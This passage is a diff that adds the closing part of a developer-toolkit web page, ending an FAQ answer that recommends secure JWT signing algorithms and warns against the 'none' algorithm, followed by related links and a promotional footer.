+        <p>For symmetric signing, use HS256 with a 256-bit random secret. For asymmetric signing, use RS256 (2048-bit RSA keys) or ES256 (ECDSA P-256) for smaller keys and faster verification. Never use the "none" algorithm in production.</p>
+      </details>
+    </section>
+
+    <section class="related-section" style="max-width:720px;margin:2rem auto;">
+      <h2>Related Research &amp; Tools</h2>
+      <div class="related-grid">
+        <a href="/research/developer-tool-usage-2026.html" class="related-card">Developer Tool Usage Rankings 2026</a>
+        <a href="/research/base64-usage-analysis.html" class="related-card">Why Base64 Is the Most Used Encoding Utility</a>
+        <a href="/" class="related-card">JWT Decoder (Browser-Based)</a>
+        <a href="/tools/base64-encode.html" class="related-card">Base64 Encoder/Decoder</a>
+        <a href="/tools/sha256-hash.html" class="related-card">SHA-256 Hash Generator</a>
+        <a href="/tools/md5-hash.html" class="related-card">MD5 Hash Generator</a>
+      </div>
+    </section>
+
+    <section class="author-section" style="max-width:720px;margin:2rem auto;">
+      <p style="font-size:0.85rem;color:var(--text-muted);">Research by <a href="/about.html">Michael Lip</a>. Published on <a href="https://kappakit.com">KappaKit</a>, a free browser-based developer toolkit. For timestamps and timezones, see <a href="https://epochpilot.com">EpochPilot</a>. For matrix math, see <a href="https://ml3x.com">ML3X</a>.</p>
+    </section>
+  </article>
+</main>
+
+<footer>
+  <div class="footer-inner">
+    <div class="footer-brand">
+      <a href="https://zovo.one/tools">Zovo Tools</a>
+      <span>Free developer tools by a solo dev. No tracking.</span>
+    </div>
+    <div class="footer-links">
+      <a href="https://kappafy.com">Kappafy</a>
+      <a href="https://claudkit.com">ClaudKit</a>
+      <a href="https://krzen.com">Krzen</a>
+      <a href="https://epochpilot.com">EpochPilot</a>
+      <a href="https://ml3x.com">ML3X</a>
+    </div>
+    <div class="footer-pro">
+      <a href="https://zovo.one/pricing?utm_source=kappakit.com&amp;utm_medium=satellite&amp;utm_campaign=footer-link">Zovo Lifetime &mdash; $99 once, free forever &rarr;</a>
+    </div>
+    <div class="footer-copy">
+      &copy; 2026 <a href="https://zovo.one">Zovo</a> &middot; 47/500 founding spots
+    </div>
+  </div>
+</footer>
+</body>
+</html>
